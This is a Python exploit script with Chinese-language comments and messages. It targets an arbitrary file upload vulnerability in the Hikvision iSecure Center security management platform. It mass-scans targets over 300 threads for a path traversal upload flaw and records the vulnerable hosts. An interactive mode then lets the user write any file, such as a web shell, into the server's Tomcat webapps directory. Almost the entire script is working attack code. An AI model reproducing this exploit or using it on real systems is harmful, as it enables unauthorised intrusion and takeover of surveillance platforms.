import argparse, requests, os, sys, re, logging, time
from multiprocessing.dummy import Pool


def banner():
    test = """   
    _                                                   __           
   (_)_______  _______  __________     ________  ____  / /____  _____
  / / ___/ _ \/ ___/ / / / ___/ _ \   / ___/ _ \/ __ \/ __/ _ \/ ___/
 / (__  )  __/ /__/ /_/ / /  /  __/  / /__/  __/ / / / /_/  __/ /    
/_/____/\___/\___/\__,_/_/   \___/   \___/\___/_/ /_/\__/\___/_/     

"""
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="海康威视isecure center 综合安防管理平台存在任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(300)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    pyload = "/center/api/files;.js"
    headers = {
        "User-Agent": "python-requests/2.31.0",
        "Accept-Encoding": "gzip,deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "multipart/form-data;boundary=e54e7e5834c8c50e92189959fe7227a4",
    }
    boundary = "e54e7e5834c8c50e92189959fe7227a4"
    data = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ccc.txt\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"ccc\r\n"
        f"--{boundary}--\r\n"
    )
    try:
        response = requests.post(url=target + pyload, headers=headers, data=data, timeout=10)
        if response.status_code == 200 and "ccc" in response.text:
            print(f"[+] {target}存在漏洞")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-] {target}不存在漏洞")
            return False
    except Exception as e:
        print(f"[-] {target}连接失败")


# 设置日志记录
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def exp(target):
    logger.info("--------------正在进行漏洞利用------------")
    time.sleep(2)

    while True:
        filename = input('请输入文件名：')
        code = input('请输入文件的内容：')
        if filename == 'q' or code == 'q':
            logger.info("正在退出,请等候……")
            break

        # 输入验证
        if not filename or not code:
            logger.error("文件名和文件内容不能为空")
            continue

        # 给文件设置变量
        url_payload = '/center/api/files;.js'
        url = target + url_payload
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
            "Cache-Control": "no-cache",
            "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
            "Pragma": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close"
        }
        data = f"--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{os.path.join('../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr', filename)}\"\r\nContent-Type: application/octet-stream\r\n\r\n{code}\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"

        try:
            response = requests.post(url=url, headers=headers, data=data, timeout=5)
            result1 = target + f'/clusterMgr/{filename};.js'
            logger.info(result1)
            if response.status_code == 200 and "filename" in response.text:
                logger.info(f"[+] {target} 存在文件上传漏洞！\n[+] 访问：{result1} \n")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
                    return True
            else:
                logger.error("[-] 不存在漏洞！！")
                return False
        except requests.exceptions.RequestException as e:
            logger.error(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")
        except Exception as e:
            logger.error(f"[*] 未知错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()